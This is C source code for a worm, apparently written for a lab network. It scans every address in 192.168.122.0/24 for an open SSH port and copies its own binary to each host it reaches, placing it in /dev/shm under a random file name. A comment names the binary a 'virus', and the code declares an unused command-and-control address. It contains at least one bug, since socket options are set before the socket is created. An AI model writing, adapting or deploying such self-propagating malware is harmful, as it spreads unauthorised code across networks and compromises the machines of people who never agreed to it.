#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/time.h>

#define FILENAME_SIZE 20
#define BUFFER_SIZE 256

void generate_random_string(char *str) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const size_t charset_size = sizeof(charset) - 1;
    memset(str, 0x0, FILENAME_SIZE);
    for (int i = 0; i < FILENAME_SIZE; i++) {
        str[i] = charset[rand() % charset_size];
    }
}

void get_random_seed(char *seed) {
    FILE *dev_urandom_fd = fopen("/dev/urandom", "r");
    if(dev_urandom_fd != NULL) {
        *seed = getc(dev_urandom_fd);
    }
}

int main(int argc, char **argv) {
    char baseIP[] = "192.168.122.";
    char c2IP[] = "192.168.122.1";
    char cmdBuffer[256];
    char randNameBuffer[20];
    int port = 22;
    int startHost = 0;
    int endHost = 254;
    char seed;
    
    get_random_seed(&seed);

    for (int i = startHost; i <= endHost; i++) {
        pid_t pid = fork();

        if (pid < 0) {
            perror("fork() failed");
            exit(EXIT_FAILURE);
        }

        if (pid == 0) {
            srand(seed ^ (getpid()<<16));
            // in child process
            int sock;
            struct sockaddr_in server_addr;
            char targetIP[32];

            // build target IP
            snprintf(targetIP, sizeof(targetIP), "%s%d", baseIP, i);

            struct timeval timeout;
            timeout.tv_sec = 1;
            timeout.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));


            // Create the socket
            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                perror("socket() failed");
                exit(EXIT_FAILURE);
            }

            // Build server_addr struct
            memset(&server_addr, 0, sizeof(server_addr));
            server_addr.sin_family = AF_INET;
            server_addr.sin_port   = htons(port);
            if (inet_pton(AF_INET, targetIP, &server_addr.sin_addr) <= 0) {
                perror("inet_pton() failed");
                close(sock);
                exit(EXIT_FAILURE);
            }

            // try socket connection
            if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
                printf("Host %s with port %d found\n", targetIP, port);
                // copy virus in tempfs
                generate_random_string(randNameBuffer);
                snprintf(cmdBuffer, sizeof(cmdBuffer), "scp %s debian@%s:/dev/shm/%s", argv[0], targetIP, randNameBuffer);
                system(cmdBuffer);
            }

            close(sock);
            exit(EXIT_SUCCESS);
        }
    }

    // wait all childs
    for (int i = startHost; i <= endHost; i++) {
        wait(NULL);
    }

    return 0;
}
